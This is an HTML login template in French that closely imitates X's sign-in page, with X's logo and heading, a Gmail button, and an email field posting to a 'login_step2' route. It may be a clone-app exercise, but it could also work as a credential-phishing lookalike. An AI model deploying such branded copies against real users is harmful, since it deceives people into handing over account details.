<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <title>Login</title>
</head>
<body>

 @if (session.has('error'))
        <div class="bg-red-500 text-white p-3 rounded-md mb-4 text-sm text-center">
          {{ session.get('error') }}
        </div>
      @endif

    <main>
        <section class="min-h-screen bg-black text-white flex items-center justify-center px-4">
            <form  method="post"  action="{{route('auth.login_step2')}}" id="auth_login" class="bg-[#16181c] rounded-xl w-full max-w-md p-6">
          
              <div class="flex justify-center mb-4">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/X_logo_2023.svg" alt="Logo X" class="h-6">
              </div>
          
               {{ csrfField() }}
              <h2 class="text-2xl font-bold text-center mb-6">Connectez-vous à X</h2>
          
        
              <div class="space-y-3">
                <button class="w-full flex items-center justify-center gap-2 bg-white text-black py-2 rounded-full hover:bg-gray-200 transition">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="w-5 h-5">
                  Se connecter avec Gmail
                </button>
              </div>
        
        
              <div class="flex items-center my-4">
                <div class="flex-grow h-px bg-gray-600"></div>
                <span class="px-2 text-gray-400 text-sm">ou</span>
                <div class="flex-grow h-px bg-gray-600"></div>
              </div>
          
              <!-- Champ identifiant -->
              <input name="email" type="text" required="" id="email" placeholder="adresse email" class="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 text-white placeholder-gray-400 mb-4 focus:outline-none focus:ring-1 focus:ring-blue-500">
          
              <!-- Bouton Suivant -->
              <button type="submit" class="w-full bg-white text-black py-3 rounded-full font-semibold hover:bg-gray-200 transition mb-3">
                Suivant
              </button>
          
              <!-- Mot de passe oublié -->
              <button class="w-full border border-gray-600 text-white py-2 rounded-full hover:bg-gray-800 transition mb-6">
                Mot de passe oublié ?
              </button>
          
              <!-- Lien d'inscription -->
              <p class="text-sm text-center text-gray-400">
                Vous n’avez pas de compte ?
                <a href="{{route('register')}}" class="text-blue-500 hover:underline">Inscrivez-vous</a>
              </p>
          
            </form>
          </section>
          
      </main>
    
</body>
</html>